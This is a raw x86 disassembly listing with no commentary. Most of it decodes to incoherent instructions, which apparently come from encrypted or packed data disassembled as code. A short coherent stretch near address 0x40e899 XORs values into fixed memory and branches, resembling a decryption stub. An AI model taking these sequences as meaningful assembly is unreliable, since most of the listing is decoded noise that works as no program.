  40e4c6:	xchg   ebp,eax
  40e4c7:	enter  0x2640,0x2f
  40e4cb:	popa   
  40e4cc:	jnp    0x40e53a
  40e4ce:	pushf  
  40e4cf:	ret    
  40e4d0:	aaa    
  40e4d1:	mov    eax,0x2c6c3f11
  40e4d6:	pop    edi
  40e4d7:	sbb    eax,0x697fc4b5
  40e4dc:	cmp    ah,ch
  40e4de:	dec    edx
  40e4df:	ins    BYTE PTR es:[edi],dx
  40e4e0:	sub    BYTE PTR [edi-0x4a],al
  40e4e3:	clc    
  40e4e4:	loope  0x40e4c1
  40e4e6:	fcomp  QWORD PTR [esi]
  40e4e8:	(bad)  
  40e4e9:	loopne 0x40e4ae
  40e4eb:	mov    eax,ds:0x955e70d9
  40e4f0:	outs   dx,DWORD PTR ds:[esi]
  40e4f1:	pop    es
  40e4f2:	(bad)
  40e4f6:	dec    eax
  40e4f7:	pusha  
  40e4f8:	cdq    
  40e4f9:	leave  
  40e4fa:	clc    
  40e4fb:	jmp    0x389977b3
  40e500:	dec    BYTE PTR [ebx-0x14]
  40e503:	(bad)  
  40e504:	mov    bh,0x35
  40e506:	adc    eax,0xf801e93c
  40e50b:	out    0x9d,eax
  40e50d:	aas    
  40e50e:	data16 xor BYTE PTR [ebp-0x3ae81e40],dh
  40e515:	(bad)  
  40e516:	fistp  WORD PTR [esp+ebx*2]
  40e519:	iret   
  40e51a:	inc    ecx
  40e51b:	pop    edi
  40e51c:	cmp    ch,bh
  40e51e:	xor    ah,al
  40e520:	lods   eax,DWORD PTR ds:[esi]
  40e521:	call   0x13c3fc3a
  40e526:	(bad)  
  40e527:	push   ss
  40e528:	push   edi
  40e529:	in     al,0x64
  40e52b:	call   DWORD PTR [ecx+0x7d979b0a]
  40e531:	xchg   ebp,eax
  40e532:	ret    0x54ba
  40e535:	sub    al,0xab
  40e537:	sub    al,0x91
  40e539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e53a:	or     al,0xa3
  40e53c:	adc    DWORD PTR [eax+0x4c7b53de],esp
  40e542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e544:	jle    0x40e52d
  40e546:	ds repnz mov cl,0xcf
  40e54a:	mov    bh,0x34
  40e54c:	arpl   WORD PTR [edx+ebp*8],si
  40e54f:	sahf   
  40e550:	das    
  40e551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e552:	inc    edx
  40e553:	stos   DWORD PTR es:[edi],eax
  40e554:	and    al,0x85
  40e556:	not    edx
  40e558:	and    al,0xde
  40e55a:	call   0x42c6:0x5da7beb0
  40e561:	mov    al,ds:0x17e9a206
  40e566:	arpl   WORD PTR [ebx-0x7e],ax
  40e569:	fwait
  40e56a:	mov    ds:0x20d9fc70,eax
  40e56f:	push   ebp
  40e570:	pop    ebp
  40e571:	or     dh,BYTE PTR [edx+0x39]
  40e574:	imul   edi,DWORD PTR [esp],0xffffffa3
  40e578:	hlt    
  40e579:	adc    DWORD PTR [edx-0x42],eax
  40e57c:	and    ebp,esp
  40e57e:	lods   al,BYTE PTR ds:[esi]
  40e57f:	xchg   ecx,eax
  40e580:	leave  
  40e581:	rcl    bh,0xc7
  40e584:	mov    ds:0x34b1d0d6,eax
  40e589:	fst    DWORD PTR ds:0x632570d8
  40e58f:	or     edx,DWORD PTR [edx-0x1d33650f]
  40e595:	dec    eax
  40e596:	pop    esi
  40e597:	fsubp  st(7),st
  40e599:	or     eax,0x608ed466
  40e59e:	sbb    BYTE PTR [eax],0x97
  40e5a1:	push   esi
  40e5a2:	sbb    dh,BYTE PTR [esi-0x46]
  40e5a5:	loop   0x40e5d4
  40e5a7:	test   BYTE PTR [esi+0x78],bl
  40e5aa:	das    
  40e5ab:	inc    ecx
  40e5ac:	(bad)  
  40e5ae:	retf   0x64f4
  40e5b1:	mov    ds:0x1297329d,al
  40e5b6:	stos   BYTE PTR es:[di],al
  40e5b8:	jge    0x40e572
  40e5ba:	sub    bh,BYTE PTR [ebp+esi*1+0x4f]
  40e5be:	or     DWORD PTR [ebx-0x1c],edi
  40e5c1:	out    dx,eax
  40e5c2:	popf   
  40e5c3:	mov    fs,esp
  40e5c5:	in     eax,0x5d
  40e5c7:	xlat   BYTE PTR ds:[ebx]
  40e5c8:	rol    DWORD PTR [ebx+ecx*2+0x1e0c1917],cl
  40e5cf:	mov    BYTE PTR es:[edx-0x37],al
  40e5d3:	xchg   ecx,eax
  40e5d4:	fdiv   st(5),st
  40e5d6:	add    ebp,DWORD PTR [ebx+edi*1]
  40e5d9:	push   ebx
  40e5da:	loopne 0x40e5aa
  40e5dc:	ins    BYTE PTR es:[edi],dx
  40e5dd:	call   0x1821:0xb3995e5b
  40e5e4:	adc    al,0xe1
  40e5e6:	dec    edi
  40e5e7:	dec    ebx
  40e5e8:	aad    0xac
  40e5ea:	inc    edi
  40e5eb:	ror    cl,cl
  40e5ed:	add    edx,DWORD PTR [ecx]
  40e5ef:	xchg   ebx,eax
  40e5f0:	add    al,0x6b
  40e5f2:	xchg   DWORD PTR [edi-0x7d25f3df],esi
  40e5f8:	shl    edi,0x80
  40e5fb:	(bad)  
  40e5fc:	clc    
  40e5fd:	xor    esp,ebp
  40e5ff:	push   es
  40e600:	cmp    al,0xa
  40e602:	ret    0xd23f
  40e605:	aas    
  40e606:	and    eax,0x22d06d1f
  40e60b:	shl    BYTE PTR [ebx-0x45c82697],1
  40e611:	retf   
  40e612:	leave  
  40e613:	lods   eax,DWORD PTR ds:[esi]
  40e614:	mov    ds:0xb824184c,eax
  40e619:	lods   eax,DWORD PTR ds:[esi]
  40e61a:	inc    ecx
  40e61b:	fisubr DWORD PTR [edx]
  40e61d:	inc    eax
  40e61e:	cmc    
  40e61f:	inc    esi
  40e620:	jle    0x40e614
  40e622:	push   es
  40e623:	rcl    DWORD PTR [esi],cl
  40e625:	pop    ebp
  40e626:	and    DWORD PTR [esi+0x77],ecx
  40e629:	in     eax,0x58
  40e62b:	push   eax
  40e62c:	mov    bl,0xff
  40e62e:	jbe    0x40e64b
  40e630:	in     al,dx
  40e631:	mov    ds:0x1d1e6bf9,al
  40e636:	dec    esp
  40e637:	mov    ds:0x3a724dbb,eax
  40e63c:	es add al,0x7a
  40e63f:	mov    dh,0x18
  40e641:	not    DWORD PTR [eax+0x50]
  40e644:	test   eax,0xeba95a2f
  40e649:	cmp    eax,0xcbc622a0
  40e64e:	ret    0xf73
  40e651:	adc    edx,0x13
  40e654:	outs   dx,DWORD PTR ds:[esi]
  40e655:	push   edi
  40e656:	add    DWORD PTR [ebx],ebp
  40e658:	ins    BYTE PTR es:[edi],dx
  40e659:	and    ebp,DWORD PTR [ecx+eax*8]
  40e65c:	push   ebp
  40e65d:	and    eax,0x88d2a9c4
  40e662:	loop   0x40e62f
  40e664:	mov    dl,0x70
  40e666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e667:	leave  
  40e668:	jp     0x40e68c
  40e66a:	imul   eax,DWORD PTR ds:0xed75d00,0x85d27ea2
  40e674:	mov    eax,0x4e75d26b
  40e679:	int    0xa0
  40e67b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e67c:	pop    ss
  40e67d:	aaa    
  40e67e:	(bad)  
  40e680:	shl    BYTE PTR [edi-0x63],0xcd
  40e684:	sub    BYTE PTR [ebx+ebp*1],ah
  40e687:	xchg   ecx,eax
  40e688:	xor    eax,DWORD PTR ds:0x8a456cf7
  40e68e:	sub    DWORD PTR [ecx],edi
  40e690:	sbb    DWORD PTR [ecx+esi*8],ebp
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	or     BYTE PTR [esi+0x8dd9bac],0x85
  40e69b:	rol    DWORD PTR [ebx+0x247add81],cl
  40e6a1:	cmp    eax,DWORD PTR [ebx+ebp*1+0xf927fca]
  40e6a8:	jl     0x40e636
  40e6aa:	xchg   ebp,eax
  40e6ab:	add    eax,0x880395e1
  40e6b0:	cdq    
  40e6b1:	in     eax,0xcc
  40e6b3:	push   esp
  40e6b4:	fidivr WORD PTR [ecx+0x3e]
  40e6b7:	cmc    
  40e6b8:	mov    ds:0xbed3e67b,eax
  40e6bd:	and    bh,BYTE PTR [edi+0x6f]
  40e6c0:	xchg   edi,eax
  40e6c1:	(bad)  
  40e6c2:	aas    
  40e6c3:	xchg   ecx,eax
  40e6c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6c5:	xor    esp,DWORD PTR [esi+eax*8-0x69324e36]
  40e6cc:	lds    ecx,FWORD PTR [esi+0x4c]
  40e6cf:	fcom   QWORD PTR [edi]
  40e6d1:	ret    
  40e6d2:	cmp    eax,DWORD PTR [ecx]
  40e6d4:	sahf   
  40e6d5:	fs push esp
  40e6d7:	cli    
  40e6d8:	std    
  40e6d9:	push   ds
  40e6da:	(bad)
  40e6dd:	push   0x1b
  40e6df:	das    
  40e6e0:	sub    bh,ah
  40e6e2:	retf   
  40e6e3:	push   ds
  40e6e4:	movaps XMMWORD PTR [eax-0x5be2b9f4],xmm2
  40e6eb:	pop    edx
  40e6ec:	stc    
  40e6ed:	pop    esp
  40e6ee:	mov    ah,0xe0
  40e6f0:	bound  eax,QWORD PTR [edi+0x7be125db]
  40e6f6:	jne    0x40e6a1
  40e6f8:	push   es
  40e6f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6fa:	ret    0xecce
  40e6fd:	cwde   
  40e6fe:	or     esp,edi
  40e700:	loopne 0x40e75c
  40e702:	ins    BYTE PTR es:[edi],dx
  40e703:	mov    ds,WORD PTR [ebp+0x15071c5d]
  40e709:	cld    
  40e70a:	rcl    DWORD PTR [edx-0x3f],cl
  40e70d:	mov    ebp,DWORD PTR [esi-0x7d]
  40e710:	in     eax,dx
  40e711:	addr16 sbb eax,0x1eb32595
  40e717:	fs push edx
  40e719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e71a:	push   ebp
  40e71b:	popa   
  40e71c:	xchg   BYTE PTR [ecx+edi*2],dh
  40e71f:	inc    esi
  40e720:	push   esi
  40e721:	or     DWORD PTR [edx],0xffffff96
  40e724:	cmp    eax,0x80592a9b
  40e729:	xchg   DWORD PTR [ebp-0x7bbcf0ac],eax
  40e72f:	cmp    esi,esi
  40e731:	cmp    al,0xc0
  40e733:	mov    BYTE PTR [ebp-0x5],ch
  40e736:	adc    edx,DWORD PTR [ebx]
  40e738:	sub    eax,0xfadde709
  40e73d:	cmp    al,0xe6
  40e73f:	out    dx,eax
  40e740:	sub    eax,0x317a36a5
  40e745:	and    eax,0xcaef746f
  40e74a:	push   eax
  40e74b:	daa    
  40e74c:	ds dec edx
  40e74e:	inc    edx
  40e74f:	xchg   ebp,eax
  40e750:	sbb    ecx,DWORD PTR [ebp-0x1988d867]
  40e756:	mov    edi,0x5aeac456
  40e75b:	(bad)  [eax-0x80]
  40e75e:	ja     0x40e6fd
  40e760:	jl     0x40e719
  40e762:	jns    0x40e72c
  40e764:	jl     0x40e7c7
  40e766:	dec    esp
  40e767:	inc    esp
  40e768:	mov    eax,ds:0x1e64fd6b
  40e76d:	mov    WORD PTR ds:0xcd818bbd,es
  40e773:	fisttp QWORD PTR [ecx]
  40e775:	sbb    BYTE PTR [ecx],ah
  40e777:	call   DWORD PTR [ecx-0x6c]
  40e77a:	push   esi
  40e77b:	xchg   esp,eax
  40e77c:	imul   ebp,ebp,0x66a48758
  40e782:	jns    0x40e715
  40e784:	push   ebp
  40e785:	inc    esp
  40e786:	pop    ss
  40e787:	jae    0x40e772
  40e789:	mov    eax,ds:0xa065ce7f
  40e78e:	mov    cl,0x2c
  40e790:	stos   DWORD PTR es:[edi],eax
  40e791:	push   ss
  40e792:	add    BYTE PTR [edi-0x2ceece77],bl
  40e798:	aaa    
  40e799:	mov    ecx,0x5fef86ff
  40e79e:	xor    eax,0x7e99150c
  40e7a3:	adc    DWORD PTR [ecx],edx
  40e7a5:	mov    dl,bl
  40e7a7:	ins    BYTE PTR es:[edi],dx
  40e7a8:	mov    eax,0x82f7b9ce
  40e7ad:	add    BYTE PTR [esi-0x3],cl
  40e7b0:	iret   
  40e7b1:	or     eax,0xe8a3af0e
  40e7b6:	jg     0x40e7fb
  40e7b8:	xchg   ecx,eax
  40e7b9:	sub    esi,DWORD PTR [edx+0x14]
  40e7bc:	mov    eax,ds:0x3756c091
  40e7c1:	sub    edx,DWORD PTR [edi-0xd]
  40e7c4:	mov    dl,0xa4
  40e7c6:	and    BYTE PTR [eax-0x77e7c114],dl
  40e7cc:	inc    edx
  40e7cd:	ins    DWORD PTR es:[edi],dx
  40e7ce:	inc    ebx
  40e7cf:	pusha  
  40e7d0:	sub    DWORD PTR [ecx+esi*1-0x41],0xb
  40e7d5:	in     eax,dx
  40e7d6:	jmp    0x40e7b1
  40e7d8:	fmul   QWORD PTR [esi+0x5e41155c]
  40e7de:	cmp    eax,0x7f2c3e41
  40e7e3:	mov    ch,0xea
  40e7e5:	ret    
  40e7e6:	push   0x9acd116c
  40e7eb:	jge    0x40e79e
  40e7ed:	in     eax,0x41
  40e7ef:	ret    
  40e7f0:	cld    
  40e7f1:	pop    ebp
  40e7f2:	repz push 0x1df56afd
  40e7f8:	add    al,0xb1
  40e7fa:	push   eax
  40e7fb:	int3   
  40e7fc:	mov    ecx,0xe1451e52
  40e801:	ja     0x40e852
  40e803:	cmpxchg BYTE PTR [edi],al
  40e806:	arpl   di,dx
  40e808:	bound  ebx,QWORD PTR [ebp+ebx*8+0x1aaf3be3]
  40e80f:	lods   al,BYTE PTR ds:[esi]
  40e810:	inc    ecx
  40e811:	js     0x40e838
  40e813:	out    0xf,eax
  40e815:	and    BYTE PTR [edx+0x55],ch
  40e818:	mov    al,0x98
  40e81a:	loop   0x40e7ab
  40e81c:	std    
  40e81d:	popa   
  40e81e:	push   edx
  40e81f:	xor    DWORD PTR [ebx-0x19ea1e2d],ebp
  40e825:	aaa    
  40e826:	sahf   
  40e827:	inc    edx
  40e828:	pop    edi
  40e829:	lds    ecx,FWORD PTR [ebx+0x1ef6c072]
  40e82f:	jecxz  0x40e8a9
  40e831:	pop    ebx
  40e832:	and    edx,DWORD PTR [ebx+eiz*4+0x129bd6ae]
  40e839:	mov    ebp,0xa10d94e9
  40e83e:	js     0x40e872
  40e840:	fidivr WORD PTR [edx-0x17]
  40e843:	or     BYTE PTR [esi],dl
  40e845:	push   esp
  40e846:	jp     0x40e7dd
  40e848:	ss xchg ebp,eax
  40e84a:	out    dx,al
  40e84b:	mov    ch,0x13
  40e84d:	dec    edx
  40e84e:	addr16 mov eax,0x767dd2d0
  40e854:	stos   DWORD PTR es:[edi],eax
  40e855:	mov    eax,0x608225b1
  40e85a:	xlat   BYTE PTR ds:[ebx]
  40e85b:	cs aad 0xcb
  40e85e:	ins    DWORD PTR es:[edi],dx
  40e85f:	xor    ah,bl
  40e861:	mul    BYTE PTR ds:0xb522c506
  40e867:	je     0x40e7f3
  40e869:	stc    
  40e86a:	push   edi
  40e86b:	mov    cl,0x5f
  40e86d:	test   DWORD PTR [eax-0x73],ebx
  40e870:	mov    ebp,0xd9e71acf
  40e875:	daa    
  40e876:	int    0x7c
  40e878:	sbb    al,0xee
  40e87a:	es mov ah,dl
  40e87d:	pop    edx
  40e87e:	xchg   edi,eax
  40e87f:	inc    ebp
  40e880:	sub    eax,0x97c37259
  40e885:	mov    BYTE PTR [ebp+eiz*4-0x59332be1],dh
  40e88c:	in     eax,0x55
  40e88e:	ds cdq 
  40e890:	out    0xe8,eax
  40e892:	lods   al,BYTE PTR ds:[esi]
  40e893:	mov    ecx,eax
  40e895:	add    esp,DWORD PTR [ebx-0x34]
  40e898:	ret    
  40e899:	pop    esi
  40e89a:	mov    al,0x6c
  40e89c:	mov    ecx,DWORD PTR [ebp-0x20]
  40e89f:	mov    esi,DWORD PTR ds:0x434455
  40e8a5:	mov    esi,DWORD PTR [esi]
  40e8a7:	xor    DWORD PTR ds:0x43439e,esi
  40e8ad:	mov    esi,0x7510855
  40e8b2:	xor    DWORD PTR ds:0x4343a2,0x4326ec
  40e8bc:	xor    eax,esi
  40e8be:	add    eax,ebx
  40e8c0:	mov    DWORD PTR ds:0x432dc2,0x3895
  40e8ca:	cmp    ecx,eax
  40e8cc:	mov    DWORD PTR ds:0x434411,0xed9
  40e8d6:	je     0x40fd3a
  40e8dc:	push   DWORD PTR [ebp-0x20]
  40e8df:	adc    DWORD PTR ds:0x432dc2,0x4326f8
  40e8e9:	push   DWORD PTR [ebp+0x8]
  40e8ec:	call   0x404cd4
  40e8f1:	jmp    0x40ece5
  40e8f6:	ret    
  40e8f7:	rcr    BYTE PTR [ebp-0x67],1
  40e8fa:	popa   
  40e8fb:	cdq    
  40e8fc:	ret    
  40e8fd:	xor    WORD PTR [eax],0xffa7
  40e901:	fimul  DWORD PTR [esi+0x2b32a98d]
  40e907:	call   0x7070:0x7d497070
  40e90e:	popf   
  40e90f:	(bad)  [edx+eax*2-0x39f1efb7]
  40e916:	mov    ebx,0x8a5bafb8
  40e91b:	jg     0x40e8b9
  40e91d:	cli    
  40e91e:	dec    edx
  40e91f:	mov    ds:0x1c1eeb84,al
  40e924:	xor    al,dl
  40e926:	ss mov ah,al
  40e929:	sub    al,0x12
  40e92b:	xor    eax,0xb97764e6
  40e930:	dec    edx
  40e931:	neg    DWORD PTR [edx]
  40e933:	jb     0x40e948
  40e935:	in     al,0x39
  40e937:	cli    
  40e938:	and    eax,0x73136d68
  40e93d:	fwait
  40e93e:	jns    0x40e9b5
  40e940:	pop    edx
  40e941:	sbb    al,0x7d
  40e943:	pop    esi
  40e944:	xchg   esp,eax
  40e945:	xor    eax,0x9c442746
  40e94a:	shl    BYTE PTR [ecx],0xf4
  40e94d:	and    al,0xcb
  40e94f:	jb     0x40e8f4
  40e951:	fnstenv [esi+0x77]
  40e954:	test   ah,al
  40e956:	pop    esp
  40e957:	dec    edi
  40e958:	cmp    ebx,DWORD PTR [eax-0x32]
  40e95b:	sbb    DWORD PTR [esi],0xe387f44e
  40e961:	dec    ecx
  40e962:	and    al,bh
  40e964:	pop    edx
  40e965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e966:	popa   
  40e967:	push   0x83c24622
  40e96c:	add    BYTE PTR [eax+0x48],bl
  40e96f:	jmp    0x40e956
  40e971:	test   eax,0x47d8376f
  40e976:	sub    bh,dh
  40e978:	out    dx,eax
  40e979:	adc    al,0x37
  40e97b:	int3   
  40e97c:	mov    ebx,0x49c92dad
  40e981:	adc    edx,DWORD PTR [esi-0x13]
  40e984:	fmul   QWORD PTR [edx-0x74]
  40e987:	cwde   
  40e988:	loopne 0x40e972
  40e98a:	xchg   ebx,eax
  40e98b:	mov    eax,ds:0xa8081389
  40e990:	ret    
  40e991:	std    
  40e992:	repnz jecxz 0x40e9d1
  40e995:	shr    DWORD PTR [esi],cl
  40e997:	mov    edx,0x98a53405
  40e99c:	fnstcw WORD PTR [edx-0x48]
  40e99f:	and    BYTE PTR [esp-0x200e22b4],al
  40e9a6:	loopne 0x40e9b8
  40e9a8:	lea    eax,[ecx+0x53]
  40e9ab:	iret   
  40e9ac:	pop    edx
  40e9ad:	jmp    0xf002f57c
  40e9b2:	call   0x8038a2b4
  40e9b7:	sub    dl,BYTE PTR [ebx]
  40e9b9:	pop    ebx
  40e9ba:	dec    eax
  40e9bb:	into   
  40e9bc:	in     al,0x2d
  40e9be:	lods   eax,DWORD PTR ds:[esi]
  40e9bf:	imul   DWORD PTR [esi-0x2d9a6266]
  40e9c5:	cli    
  40e9c6:	int3   
  40e9c7:	lods   eax,DWORD PTR ds:[esi]
  40e9c8:	push   ss
  40e9c9:	dec    edx
  40e9ca:	in     al,dx
  40e9cb:	enter  0xed4f,0xd2
  40e9cf:	sbb    BYTE PTR [edx-0x6dae4a83],dl
  40e9d5:	scas   eax,DWORD PTR es:[edi]
  40e9d6:	inc    esp
  40e9d7:	push   ecx
  40e9d8:	xchg   ecx,eax
  40e9d9:	adc    esp,0xffffff8b
  40e9dc:	pop    esp
  40e9dd:	clc    
  40e9de:	sbb    dh,BYTE PTR [ebp+0x71]
  40e9e1:	jns    0x40e9f7
  40e9e3:	popf   
  40e9e4:	jno    0x40e9db
  40e9e6:	xor    edi,esp
  40e9e8:	shr    ebp,1
  40e9ea:	add    eax,0x966cb72a
  40e9ef:	data16 and BYTE PTR [eax],ah
  40e9f2:	jo     0x40e9f6
  40e9f4:	test   DWORD PTR ds:0xe413a584,edi
  40e9fa:	pop    ecx
  40e9fb:	cli    
  40e9fc:	mov    ebp,0xff345072
  40ea01:	(bad)  [eax-0x4c]
  40ea04:	jge    0x40e992
  40ea06:	xor    bl,BYTE PTR [edi-0x19e96ef6]
  40ea0c:	xchg   edx,eax
  40ea0d:	adc    eax,0x23571953
  40ea12:	popf   
  40ea13:	sub    eax,DWORD PTR [ebx+0x35]
  40ea16:	pop    ebp
  40ea17:	dec    esp
  40ea18:	inc    ecx
  40ea19:	std    
  40ea1a:	sbb    al,0x4b
  40ea1c:	mov    edi,0x8dcc22b3
  40ea21:	(bad)  
  40ea22:	push   esi
  40ea23:	mov    DWORD PTR ds:0xaee9c00f,ebx
  40ea29:	xor    eax,0x16cd104b
  40ea2e:	adc    dl,BYTE PTR [edx]
  40ea30:	xchg   ecx,eax
  40ea31:	outs   dx,BYTE PTR ds:[esi]
  40ea32:	add    edi,DWORD PTR [edx+0xa]
  40ea35:	jmp    0x5a9b595f
  40ea3a:	jge    0x40ea2a
  40ea3c:	(bad)  [edi+esi*4+0x61]
  40ea40:	push   ss
  40ea41:	mov    ds:0x30dc63c8,al
  40ea46:	outs   dx,BYTE PTR ds:[esi]
  40ea47:	hlt    
  40ea48:	pop    eax
  40ea49:	rol    DWORD PTR ss:[edx-0x4404b699],0xe3
  40ea51:	inc    edx
  40ea52:	je     0x40eab0
  40ea54:	mov    ecx,edx
  40ea56:	repz fcmovne st,st(7)
  40ea59:	ret    
  40ea5a:	and    dl,dl
  40ea5c:	push   ebp
  40ea5d:	jns    0x40ea73
  40ea5f:	sub    eax,DWORD PTR [edi+0x148e81b7]
  40ea65:	cli    
  40ea66:	retf   
  40ea67:	push   ebx
  40ea68:	lock pop DWORD PTR [ebp+0x12]
  40ea6c:	hlt    
  40ea6d:	push   edx
  40ea6e:	jge    0x40ea88
  40ea70:	jmp    0xb0d63de8
  40ea75:	sub    ebx,edx
  40ea77:	dec    esi
  40ea78:	cdq    
  40ea79:	cmp    al,0xbf
  40ea7b:	call   0xadecde85
  40ea80:	leave  
  40ea81:	ins    DWORD PTR es:[edi],dx
  40ea82:	test   DWORD PTR fs:[esi],ebp
  40ea85:	clc    
  40ea86:	jle    0x40eabf
  40ea88:	mov    ch,0xeb
  40ea8a:	lods   eax,DWORD PTR ds:[esi]
  40ea8b:	(bad)  
  40ea8c:	xor    eax,DWORD PTR [eax-0x6a5e2701]
  40ea92:	xor    al,0x85
  40ea94:	je     0x40ea60
  40ea96:	pop    ss
  40ea97:	scas   eax,DWORD PTR es:[edi]
  40ea98:	das    
  40ea99:	imul   esp,DWORD PTR [edi+0x37],0xffffffa7
  40ea9d:	pop    esi
  40ea9e:	test   esp,0xf0c46c8f
  40eaa4:	out    dx,eax
  40eaa5:	pop    esp
  40eaa6:	lods   al,BYTE PTR ds:[esi]
  40eaa7:	jg     0x40ea45
  40eaa9:	adc    al,0x12
  40eaab:	add    eax,0xfc2a07f9
  40eab0:	into   
  40eab1:	push   ecx
  40eab2:	vandps xmm0,xmm4,XMMWORD PTR [esp+edi*4-0x6f]
  40eab8:	js     0x40ea71
  40eaba:	sbb    DWORD PTR [ebx+esi*2-0x69a9c97c],eax
  40eac1:	in     eax,dx
  40eac2:	or     eax,0x5629a9dd
  40eac7:	test   BYTE PTR [ebx+ebp*1],cl
  40eaca:	add    al,0xf
  40eacc:	cmp    ch,ah
  40eace:	dec    ebx
  40eacf:	cmc    
  40ead0:	mov    ebp,0xf4a7b42b
  40ead5:	outs   dx,DWORD PTR ds:[esi]
  40ead6:	or     edx,0x8605ff9e
  40eadc:	add    edi,DWORD PTR [edi+ebp*2]
  40eadf:	cs and dl,bl
  40eae2:	arpl   di,ax
  40eae4:	or     DWORD PTR [ebx-0x6ce2616a],esp
  40eaea:	xchg   BYTE PTR [esi],bh
  40eaec:	rol    BYTE PTR [eax],cl
  40eaee:	or     eax,0x2b816047
  40eaf3:	xchg   esi,eax
  40eaf4:	frstor [esi-0x2e971cab]
  40eafa:	lahf   
  40eafb:	sti    
  40eafc:	pop    esi
  40eafd:	in     al,dx
  40eafe:	ins    DWORD PTR es:[edi],dx
  40eaff:	shl    BYTE PTR [edi-0x72],1
  40eb02:	outs   dx,DWORD PTR ds:[esi]
  40eb03:	div    DWORD PTR [edx-0x5502a958]
  40eb09:	ror    BYTE PTR [esi+edi*8-0x7f8e224e],0xf2
  40eb11:	push   ebx
  40eb12:	add    al,cl
  40eb14:	(bad)  
  40eb15:	(bad)  
  40eb16:	jg     0x40eb75
  40eb18:	pop    esi
  40eb19:	push   eax
  40eb1a:	xchg   esi,eax
  40eb1b:	cmp    al,BYTE PTR [ecx-0x21]
  40eb1e:	push   es
  40eb1f:	arpl   WORD PTR [eax-0x78],cx
  40eb22:	imul   ecx,edx,0x9b7086c3
  40eb28:	leave  
  40eb29:	adc    eax,0xa285716b
  40eb2e:	or     edx,DWORD PTR [eax-0x7b]
  40eb31:	cmp    eax,0xc2dce6d4
  40eb36:	inc    edi
  40eb37:	dec    ebp
  40eb38:	add    cl,BYTE PTR [ebp+0x64eea725]
  40eb3e:	mov    cl,0xf2
  40eb40:	push   esi
  40eb41:	and    dl,bl
  40eb43:	xlat   BYTE PTR ds:[ebx]
  40eb44:	ret    
  40eb45:	(bad)  
  40eb46:	add    BYTE PTR [ebx-0x55a6bdc8],ch
  40eb4c:	loope  0x40eaea
  40eb4e:	mov    ah,BYTE PTR [ebp-0xc29a4d9]
  40eb54:	outs   dx,BYTE PTR ds:[si]
  40eb56:	cmc    
  40eb57:	lahf   
  40eb58:	xchg   ebp,eax
  40eb59:	lea    esi,[ebx]
  40eb5b:	(bad)  
  40eb5c:	push   edx
  40eb5d:	sbb    BYTE PTR ds:0x1b13b212,cl
  40eb63:	mov    cl,0xac
  40eb65:	xchg   ebp,eax
  40eb66:	or     dl,BYTE PTR [edx+0x404f84b2]
  40eb6c:	dec    esp
  40eb6d:	aam    0x2e
  40eb6f:	push   edi
  40eb70:	add    esp,DWORD PTR [esi-0x46]
  40eb73:	pop    ecx
  40eb74:	pop    esp
  40eb75:	mov    edi,0x582aaa38
  40eb7a:	inc    edx
  40eb7b:	jno    0x40ebd7
  40eb7d:	stos   BYTE PTR es:[edi],al
  40eb7e:	into   
  40eb7f:	cmp    cl,BYTE PTR [edi+eiz*2]
  40eb82:	cmp    esp,DWORD PTR [esi+esi*8]
  40eb85:	ds jbe 0x40ebd2
  40eb88:	ss cmc 
  40eb8a:	mov    ds:0x5bf30bfa,al
  40eb8f:	sbb    bh,BYTE PTR [ecx-0x69]
  40eb92:	shl    edi,1
  40eb94:	out    0xfc,eax
  40eb96:	push   0x44
  40eb98:	fwait
  40eb99:	cmp    al,0x7d
  40eb9b:	jo     0x40ebd5
  40eb9d:	sti    
  40eb9e:	pop    es
  40eb9f:	mov    ebx,0x2d219795
  40eba4:	clc    
  40eba5:	out    dx,eax
  40eba6:	adc    bh,bl
  40eba8:	cdq    
  40eba9:	test   al,0xba
  40ebab:	jno    0x40ebbb
  40ebad:	(bad)  
  40ebae:	or     ecx,DWORD PTR [eax]
  40ebb0:	les    esi,FWORD PTR [ebx-0x4e1617d8]
  40ebb6:	adc    ebp,DWORD PTR [eax-0x80]
  40ebb9:	sub    edi,edx
  40ebbb:	push   ss
  40ebbc:	repnz out 0x82,eax
  40ebbf:	aaa    
  40ebc0:	jp     0x40ec11
  40ebc2:	out    0x91,al
  40ebc4:	ja     0x40ec0e
  40ebc6:	mov    esi,0x7461a73
  40ebcb:	scas   eax,DWORD PTR es:[edi]
  40ebcc:	or     esp,ebx
  40ebce:	add    esp,ecx
  40ebd0:	(bad)  
  40ebd2:	sub    bh,BYTE PTR [ebp+0x3eae8b90]
  40ebd8:	or     DWORD PTR [edx+0xd],0xffffffed
  40ebdc:	xor    BYTE PTR [ecx+0x698f2452],ah
  40ebe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe3:	sar    ebp,cl
  40ebe5:	jns    0x40eb9f
  40ebe7:	xor    dh,BYTE PTR [edi+0x63b1d270]
  40ebed:	mov    edx,DWORD PTR [ecx]
  40ebef:	dec    esi
  40ebf0:	mov    al,0x16
  40ebf2:	push   0xf5531f43
  40ebf7:	pop    edx
  40ebf8:	nop
  40ebf9:	push   cs
  40ebfa:	jb     0x40ebc8
  40ebfc:	push   0x31
  40ebfe:	mov    ecx,0x17a8eef8
  40ec03:	shl    BYTE PTR [ebx-0x5f04f3e6],cl
  40ec09:	fxch   st(5)
  40ec0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec0c:	jne    0x40ebd4
  40ec0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec0f:	idiv   dl
  40ec11:	dec    ebx
  40ec12:	sub    eax,0xd04897e7
  40ec17:	lock sub BYTE PTR [edx-0x70],0x1b
  40ec1c:	jecxz  0x40ec7b
  40ec1e:	outs   dx,BYTE PTR ds:[esi]
  40ec1f:	out    dx,al
  40ec20:	test   al,0x70
  40ec22:	xor    eax,0xf62d4c60
  40ec27:	mov    ss,WORD PTR [ecx]
  40ec29:	xor    al,0xe7
